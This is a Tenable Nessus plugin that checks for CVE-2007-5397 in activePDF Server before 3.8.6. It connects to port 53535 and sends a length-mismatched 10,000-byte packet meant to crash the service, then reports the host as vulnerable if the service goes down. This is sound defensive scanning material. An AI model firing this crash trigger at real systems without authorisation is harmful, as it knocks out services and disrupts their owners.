#
#  (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(31349);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2007-5397");
  script_bugtraq_id(28013);
  script_osvdb_id(42971);
  script_xref(name:"Secunia", value:"27371");

  script_name(english:"activePDF Server < 3.8.6 Packet Handling Remote Overflow");
  script_summary(english:"Tries to crash the service");

 script_set_attribute(attribute:"synopsis", value:
"The remote Windows host contains a program that is affected by a
buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"activePDF Server is installed on the remote host.  It is used to
provide PDF generation and conversion from within enterprise and web
applications.

The version of activePDF Server installed on the remote host contains
a heap-based buffer overflow that can be triggered by sending a packet
specifying a size smaller than the actual size of the following data.
An unauthenticated, remote attacker may be able to leverage this issue
to crash the affected service or execute arbitrary code.

Note that the service runs with SYSTEM privileges, so successful
exploitation could lead to a complete compromise of the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2007-87/advisory" );
 script_set_attribute(attribute:"see_also", value:"http://www.activepdf.com/support/knowledgebase/viewKb.cfm?fs=1&ID=11744" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to activePDF version 3.8.6 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
 script_cwe_id(119);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/03/05");
 script_cvs_date("$Date: 2016/05/04 14:21:27 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");
  script_dependencies("find_service1.nasl");
  script_require_ports("Services/activepdf_server", 53535);

  exit(0);
}


include("byte_func.inc");
include("misc_func.inc");


port = get_kb_item("Services/activepdf_server");
if (!port) port = 53535;
if (!get_port_state(port)) exit(0, "Port "+port+" is closed.");


# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(1, "Cannot connect to TCP port "+port+".");


# Read the banner.
res = recv(socket:soc, length:32, min:11);


# If it looks like activePDF Server...
if (
  strlen(res) >= 11 && 
  stridx(res, raw_string(0x07, 0x00, 0x00, 0x00, 'APCX-OK')) == 0
)
{
  # Try to crash it.
  set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

  req = mkdword(0x07) + crap(10000);
  send(socket:soc, data:req);
  res = recv(socket:soc, length:32, min:4);
  close(soc);

  # Try to reestablish a connection and read the banner.
  soc2 = open_sock_tcp(port);
  if (soc2)
  {
    res2 = recv(socket:soc2, length:32, min:11);
    close(soc2);
  }

  # If we couldn't establish the connection or read the banner,
  # there's a problem.
  if (!soc2 || strlen(res2) == 0)
  {
    security_hole(port);
    exit(0);
  }
}
